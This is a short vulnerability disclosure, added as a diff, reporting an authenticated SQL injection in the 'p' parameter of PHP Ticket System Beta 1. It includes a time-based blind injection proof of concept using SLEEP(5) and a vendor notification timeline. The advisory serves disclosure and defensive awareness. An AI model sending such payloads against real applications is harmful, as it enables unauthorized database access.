@@ -1,0 +1,34 @@
+# Exploit Title: PHP Ticket System Beta 1 'p' SQL Injection
+# Date: 04/16/12
+# Author: G13
+# Twitter: @g13net
+# Software Site: http://sourceforge.net/projects/phpticketsystem/
+# Version: Beta 1
+# Category: webapp (php)
+#
+
+##### Description #####
+
+PHP Ticket System is a small PHP MySQL trouble ticket or work
+ordersystem that is a work in progress.
+
+##### Vulnerability #####
+
+The 'p' parameter on index.php is vulnerable to SQL Injection.
+
+A user must be signed in to perform this attack.
+
+##### Exploit #####
+
+http://localhost/index.php?p=[SQLi]&id=211&_=1334627588812
+
+##### PoC #####
+
+http://localhost/index.php?p=edit_ticket' AND SLEEP(5) AND
+'yoUg'='yoUg&id=211&_=1334627588812
+
+##### Vendor Notification #####
+
+4/16/12 - Vendor Notified
+4/17/12 - Vendor reponse, will be fixed in next release
+4/24/12 - Disclosure
